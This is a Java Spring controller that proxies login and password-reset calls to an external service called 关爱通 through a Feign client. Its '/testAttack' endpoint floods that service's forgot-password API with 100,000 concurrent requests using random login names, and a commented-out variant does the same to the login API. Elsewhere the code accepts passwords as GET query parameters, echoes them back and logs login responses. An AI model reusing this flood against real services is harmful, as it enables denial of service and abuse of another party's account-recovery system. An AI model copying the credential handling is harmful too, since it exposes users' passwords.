package com.micro.standard.module.core.web.controller;

import java.util.Map;

import javax.annotation.Resource;

import org.apache.commons.collections4.MapUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.http.MediaType;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSONObject;
import com.google.common.base.Preconditions;
import com.google.common.collect.Maps;
import com.micro.standard.module.common.annotation.EnableLog;
import com.micro.standard.module.core.web.feign.GATFeign;

import cn.hutool.core.lang.Snowflake;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@RestController
@RequestMapping(value = "/v1/test", produces = MediaType.APPLICATION_JSON_VALUE)
public class WebController {

	@Resource
	private ThreadPoolTaskExecutor threadPoolBatchExecutor;

	@Resource
	private GATFeign gatFeign;

	@Resource
	private Snowflake snowflake;

	@EnableLog
	@RequestMapping(value = "/doLogin", method = RequestMethod.POST)
	public JSONObject doLoginByPC(@RequestBody JSONObject req) {
		Preconditions.checkArgument(MapUtils.isNotEmpty(req), "请求参数为空！");

		String loginName = req.getString("loginName");
		String password = req.getString("password");
		String sig = req.getString("sig");
		String csessionid = req.getString("csessionid");

		Map<String, String> map = Maps.newHashMap();
		map.put("loginName", loginName);
		map.put("password", password);
		map.put("sig", sig);
		map.put("csessionid", csessionid);

		JSONObject resp = gatFeign.doLogin(map);
		log.info("关爱通登录信息:{}", resp);

		return resp;
	}

	@EnableLog
	@RequestMapping(value = "/testPost", method = RequestMethod.POST)
	public JSONObject testPost(@RequestBody JSONObject req) {
		Preconditions.checkArgument(MapUtils.isNotEmpty(req), "请求参数为空！");

		Map<String, String> map = Maps.newHashMap();
		map.put("loginName", "1234");
		map.put("verificationCode", "");
		map.put("sig", "");
		map.put("csessionid", " ");
		JSONObject resp = gatFeign.forgetPwd(map);

		return resp;
	}

	@EnableLog
	@RequestMapping(value = "/testGet", method = RequestMethod.GET)
	public JSONObject testGet(@RequestParam("loginName") String loginName, @RequestParam("password") String password) {
		Preconditions.checkArgument(StringUtils.isNotBlank(loginName), "登录名为空！");
		Preconditions.checkArgument(StringUtils.isNotBlank(password), "登录密码为空！");

		JSONObject resp = new JSONObject();
		resp.put("loginName", loginName);
		resp.put("password", password);

		return resp;
	}

	@EnableLog
	@RequestMapping(value = "/testAttack", method = RequestMethod.GET)
	public void testAttack() throws Exception {
		for (int i = 1; i <= 100000; i++) {
			if (i == 100000) {
				log.info("执行完毕！");
			}

			threadPoolBatchExecutor.execute(() -> {
				doLogin();
			});

			if (i % 100 == 0) {
				Thread.sleep(0);
			}
		}

	}

	JSONObject doLogin() {
		String attackStr = snowflake.nextIdStr();

		Map<String, String> map = Maps.newHashMap();
//		map.put("loginName", attackStr);
//		map.put("password", attackStr);
//		map.put("sig", "");
//		map.put("csessionid", attackStr);
//		JSONObject resp = gatFeign.doLogin(map);

		map.put("loginName", attackStr);
		map.put("verificationCode", "");
		map.put("sig", "");
		map.put("csessionid", attackStr);
		JSONObject resp = gatFeign.forgetPwd(map);

		return resp;
	}

}
